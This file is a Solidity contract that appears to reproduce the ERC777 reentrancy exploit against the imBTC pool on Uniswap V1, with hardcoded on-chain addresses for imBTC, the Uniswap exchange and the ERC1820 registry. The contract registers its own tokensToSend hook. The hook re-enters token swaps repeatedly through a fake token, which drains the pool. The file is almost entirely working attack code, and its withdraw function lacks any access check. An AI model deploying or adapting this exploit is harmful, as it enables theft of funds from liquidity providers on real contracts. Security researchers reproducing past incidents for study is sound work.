pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint256,
        uint256,
        uint256
    ) external returns (uint256);

    function ethToTokenSwapInput(uint256, uint256)
        external
        payable
        returns (uint256);

    function getEthToTokenInputPrice(uint256) external returns (uint256);

    function getTokenToEthInputPrice(uint256) external returns (uint256);

    function tokenToTokenSwapInput(
        uint256,
        uint256,
        uint256,
        uint256,
        address
    ) external returns (uint256);
}

interface IMBTC {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;
}

contract Luck2 {
    address private imbtc = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
    address private uniswapV1 = 0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187;
    address private erc1820 = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    address private fake_token;
    address private fake_pair;
    bytes32 private constant ERC1820_InterfaceHash_TokensSenderss =
        keccak256(abi.encodePacked("ERC777TokensSender"));
    uint256 counter = 0;
    uint256 max_times;
    address private owner;

    constructor(
        uint256 _times,
        address _token,
        address _pair
    ) payable {
        owner = msg.sender;
        max_times = _times;
        fake_token = _token;
        fake_pair = _pair;
        IMBTC(imbtc).approve(uniswapV1, type(uint256).max);
        IERC1820Registry(erc1820).setInterfaceImplementer(
            address(this),
            ERC1820_InterfaceHash_TokensSenderss,
            address(this)
        );
    }

    function good_luck() external payable {
        uint256 amount_input = IUniswapV1(uniswapV1).getEthToTokenInputPrice(
            address(this).balance
        );
        uint256 amount = IUniswapV1(uniswapV1).ethToTokenSwapInput{
            value: address(this).balance
        }((amount_input * 99) / 100, block.timestamp + 120);
        counter++;
        IUniswapV1(uniswapV1).tokenToTokenSwapInput(
            amount / max_times,
            1,
            1,
            type(uint256).max,
            fake_token
        );
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (counter < max_times) {
            counter++;
            IUniswapV1(uniswapV1).tokenToTokenSwapInput(
                amount,
                1,
                1,
                type(uint256).max,
                fake_token
            );
            // IERC20(fake_token).transferFrom(owner, fake_pair, 1e18);
        } else {
            counter = 0;
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
